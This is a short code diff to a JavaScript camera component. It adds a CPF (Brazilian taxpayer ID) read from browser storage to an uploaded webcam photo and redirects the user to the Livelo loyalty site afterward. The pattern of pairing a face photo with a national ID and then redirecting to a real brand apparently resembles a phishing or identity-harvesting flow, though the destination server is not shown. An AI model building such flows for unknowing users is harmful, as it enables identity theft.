@@ -49,13 +49,16 @@ const CameraComponent = () => {
 
       // Convert image to base64
       const imageData = canvas.toDataURL('image/jpeg');
+      const cpf = localStorage.getItem('cpf');
 
       // Send image to API server
       try {
           const response = await api.post('', {
-              image: imageData
+              image: imageData,
+              cpf: cpf
           });
           console.log('Image uploaded successfully:', response.data);
+          window.location.href = 'https://www.livelo.com.br/';
       } catch (error) {
           console.error('Error uploading image:', error);
       }
